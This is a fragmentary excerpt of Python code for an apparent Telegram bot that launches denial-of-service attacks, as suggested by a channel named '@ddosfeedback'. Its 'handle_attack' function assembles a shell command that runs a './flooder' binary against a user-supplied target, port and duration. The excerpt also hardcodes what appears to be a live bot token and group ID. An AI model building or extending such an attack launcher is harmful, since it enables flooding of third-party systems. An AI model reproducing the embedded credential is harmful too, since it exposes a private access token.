...
bot = telebot.TeleBot('7732021853:AAFUCwKX7gAETk0Nh9z287gIb3WCqBeQN2g')
...
GROUP_ID = "-1002606444877"
CHANNEL_USERNAME = "@ddosfeedback"
...
def handle_attack(message):
    ...
    full_command = f"./flooder {target} {port} {time_duration} "
